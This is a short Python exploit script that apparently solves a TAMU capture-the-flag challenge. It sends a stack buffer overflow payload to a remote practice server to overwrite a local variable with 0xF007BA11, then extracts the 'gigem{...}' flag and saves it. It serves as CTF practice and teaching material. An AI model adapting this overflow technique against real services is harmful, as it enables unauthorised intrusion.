# https://ctftime.org/task/5395
from zio import *
import re

flag_pattern = r"gigem{.+?}"

off_s = -0x23
off_v5 = -0xC
junk = 'a'
target_num = 0xF007BA11

payload = (off_v5 - off_s) * junk + l32(target_num)

server = "pwn.ctf.tamu.edu", 4321
io = zio(server, print_read=False, print_write=False)
io.writeline(payload)
content = io.read_until_re(flag_pattern)
flag = re.search(flag_pattern, content).group()

with open('flag', 'wb') as f:
	f.write(flag)
